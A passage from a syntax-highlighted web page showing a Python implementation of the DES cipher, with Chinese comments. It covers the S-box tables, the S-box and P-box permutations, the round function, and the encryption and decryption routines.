<span class="token number">0</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span>
<span class="token number">13</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>
<span class="token number">13</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>
<span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>
<span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span>
<span class="token number">13</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>
<span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>
<span class="token number">3</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>
<span class="token number">14</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span>
<span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span>
<span class="token number">11</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span>
<span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>
<span class="token number">9</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span>
<span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>
<span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span>
<span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>
<span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>
<span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>
<span class="token number">7</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>
<span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># S盒置换</span>
<span class="token keyword">def</span> <span class="token function">s_change</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    c_num<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        now_string<span class="token operator">=</span>string<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>
        <span class="token comment" spellcheck="true"># print(now_string)</span>
        row<span class="token operator">=</span>int<span class="token punctuation">(</span>now_string<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>now_string<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
        col<span class="token operator">=</span>int<span class="token punctuation">(</span>now_string<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
        num<span class="token operator">=</span>bin<span class="token punctuation">(</span>S<span class="token punctuation">[</span>c_num<span class="token punctuation">]</span><span class="token punctuation">[</span>row<span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> gz <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token operator">-</span>len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            num<span class="token operator">=</span><span class="token string">'0'</span><span class="token operator">+</span>num
        res<span class="token operator">+=</span>num
        c_num<span class="token operator">+=</span><span class="token number">1</span>
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># P盒置换表</span>
P<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span>
    <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span>
    <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>
    <span class="token number">19</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># P盒置换</span>
<span class="token keyword">def</span> <span class="token function">p_change</span><span class="token punctuation">(</span>bin_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token operator">=</span><span class="token string">""</span>
    <span class="token comment" spellcheck="true"># print(len(bin_string))</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> P<span class="token punctuation">:</span>
        res<span class="token operator">+=</span>bin_string<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> res

<span class="token comment" spellcheck="true"># F函数</span>
<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>bin_string<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    first<span class="token operator">=</span>e_change<span class="token punctuation">(</span>bin_string<span class="token punctuation">)</span>
    second<span class="token operator">=</span>str_xor<span class="token punctuation">(</span>first<span class="token punctuation">,</span>key<span class="token punctuation">)</span>
    third<span class="token operator">=</span>s_change<span class="token punctuation">(</span>second<span class="token punctuation">)</span>
    last<span class="token operator">=</span>p_change<span class="token punctuation">(</span>third<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(last)</span>
    <span class="token keyword">return</span> last

<span class="token comment" spellcheck="true"># DES加密</span>
<span class="token keyword">def</span> <span class="token function">des_encrypt</span><span class="token punctuation">(</span>bin_message<span class="token punctuation">,</span>bin_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip_bin_message<span class="token operator">=</span>ip_change<span class="token punctuation">(</span>bin_message<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(ip_bin_message)</span>
    key_list<span class="token operator">=</span>get_key<span class="token punctuation">(</span>bin_key<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(key_list)</span>
    mes_left<span class="token operator">=</span>ip_bin_message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>
    mes_right<span class="token operator">=</span>ip_bin_message<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        mes_tmp<span class="token operator">=</span>mes_right
        <span class="token comment" spellcheck="true"># print(i)</span>
        f_res<span class="token operator">=</span>f<span class="token punctuation">(</span>mes_tmp<span class="token punctuation">,</span>key_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        mes_right<span class="token operator">=</span>str_xor<span class="token punctuation">(</span>mes_left<span class="token punctuation">,</span>f_res<span class="token punctuation">)</span>
        mes_left<span class="token operator">=</span>mes_tmp
    f_result <span class="token operator">=</span> f<span class="token punctuation">(</span>mes_right<span class="token punctuation">,</span>key_list<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#第16次不用换位，故不用暂存右边</span>
    <span class="token comment" spellcheck="true"># print(f_result)</span>
    mes_fin_left <span class="token operator">=</span> str_xor<span class="token punctuation">(</span>mes_left<span class="token punctuation">,</span>f_result<span class="token punctuation">)</span>
    mes_fin_right <span class="token operator">=</span> mes_right
    <span class="token comment" spellcheck="true"># print(mes_right)</span>
    <span class="token comment" spellcheck="true"># print(mes_fin_left)</span>
    f_message<span class="token operator">=</span>re_ip_change<span class="token punctuation">(</span>mes_fin_left<span class="token operator">+</span>mes_right<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(f_message)</span>
    <span class="token keyword">return</span> f_message

<span class="token comment" spellcheck="true"># DES解密</span>
<span class="token keyword">def</span> <span class="token function">des_decrypt</span><span class="token punctuation">(</span>bin_message<span class="token punctuation">,</span>bin_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip_bin_message<span class="token operator">=</span>ip_change<span class="token punctuation">(</span>bin_message<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(ip_bin_message)</span>
    key_list<span class="token operator">=</span>get_key<span class="token punctuation">(</span>bin_key<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(bin)</span>
    mes_left<span class="token operator">=</span>ip_bin_message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>
    mes_right<span class="token operator">=</span>ip_bin_message<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    lst<span class="token operator">=</span>range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> lst<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># print(i)</span>
        mes_tmp<span class="token operator">=</span>mes_right
        f_res<span class="token operator">=</span>f<span class="token punctuation">(</span>mes_tmp<span class="token punctuation">,</span>key_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        mes_right<span class="token operator">=</span>str_xor<span class="token punctuation">(</span>mes_left<span class="token punctuation">,</span>f_res<span class="token punctuation">)</span>
        mes_left<span class="token operator">=</span>mes_tmp
    f_result<span class="token operator">=</span>f<span class="token punctuation">(</span>mes_right<span class="token punctuation">,</span>key_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    mes_fin_left<span class="token operator">=</span>str_xor<span class="token punctuation">(</span>mes_left<span class="token punctuation">,</span>f_result<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(mes_fin_left)</span>
    f_message<span class="token operator">=</span>re_ip_change<span class="token punctuation">(</span>mes_fin_left<span class="token operator">+</span>mes_right<span class="token punctuation">)</span>
    <span class="token keyword">return</span> f_message


<span class="token comment" spellcheck="true"># def input_key_64(key):</span>
<span class="token comment" spellcheck="true">#     bin_key=str2bin(key)</span>
<span class="token comment" spellcheck="true">#     ans=len(bin_key)</span>
<span class="token comment" spellcheck="true">#     if len(bin_key)&lt;64:</span>
<span class="token comment" spellcheck="true">#         if ans%64!=0:</span>
<span class="token comment" spellcheck="true">#             for i in range(64-(ans%64)):</span>
